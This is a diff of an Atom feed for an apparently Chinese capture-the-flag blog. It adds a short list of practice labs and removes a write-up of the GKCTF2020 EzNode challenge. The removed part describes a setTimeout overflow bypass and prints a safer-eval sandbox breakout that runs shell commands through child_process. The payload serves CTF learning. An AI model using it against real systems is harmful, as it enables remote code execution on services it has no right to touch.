@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://ev11ccaatt.github.io</id>
     <title>ev11ccaatt</title>
-    <updated>2021-07-04T06:13:13.540Z</updated>
+    <updated>2021-08-05T12:44:34.478Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://ev11ccaatt.github.io"/>
     <link rel="self" href="https://ev11ccaatt.github.io/atom.xml"/>
@@ -10,6 +10,17 @@
     <logo>https://ev11ccaatt.github.io/images/avatar.png</logo>
     <icon>https://ev11ccaatt.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, ev11ccaatt</rights>
+    <entry>
+        <title type="html"><![CDATA[做过的靶场汇总，]]></title>
+        <id>https://ev11ccaatt.github.io/post/zuo-guo-de-ba-chang-hui-zong/</id>
+        <link href="https://ev11ccaatt.github.io/post/zuo-guo-de-ba-chang-hui-zong/">
+        </link>
+        <updated>2021-08-05T12:43:35.000Z</updated>
+        <content type="html"><![CDATA[<p>sqlilab<br>
+uploadlab<br>
+MemLabs</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[羊城杯 2020]逃离东南亚]]></title>
         <id>https://ev11ccaatt.github.io/post/yang-cheng-bei-2020tao-chi-dong-nan-ya/</id>
@@ -406,21 +417,6 @@ print(flag)
 <p>可以看到username=cookie，题目要求我们用admin登录，那么先粗糙的直接修改试试。</p>
 <figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417180445850.png" alt="image-20210417180445850" loading="lazy"></figure>
 <p>Bingo！</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[GKCTF2020]EZ三剑客-EzNode]]></title>
-        <id>https://ev11ccaatt.github.io/post/gkctf2020ez-san-jian-ke-eznode/</id>
-        <link href="https://ev11ccaatt.github.io/post/gkctf2020ez-san-jian-ke-eznode/">
-        </link>
-        <updated>2021-04-17T09:36:50.000Z</updated>
-        <content type="html"><![CDATA[<p>进去能够看到源码，和版本信息。这里<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417173803293.png" alt="image-20210417173803293" loading="lazy">提到了一个库，然后也提供了其版本，尝试去找下是否有已知的，是有<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2019-36849">国家信息安全漏洞共享平台 (cnvd.org.cn)</a>但是版本要&lt;1.3.2</p>
-<p>那么再来看下源码，发现不管算什么，都会超时，那么考虑把<img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417174240697.png" alt="image-20210417174240697" loading="lazy">这一块给绕过，可以采用setTimeout自带的int溢出洞来绕过（如果传入的delay&gt;2147483647，那么delay会被设为1。</p>
-<p>在<a href="https://github.com/commenthol/safer-eval/issues/10">Breakout · Issue #10 · commenthol/safer-eval (github.com)</a>找到答案,</p>
-<pre><code class="language-(function(){">const process = clearImmediate.constructor(&quot;return process;&quot;)();
-return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()})()
-</code></pre>
-<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/ev11ccaatt/mypicture/master/img/image-20210417180101184.png" alt="image-20210417180101184" loading="lazy"></figure>
 ]]></content>
     </entry>
 </feed>
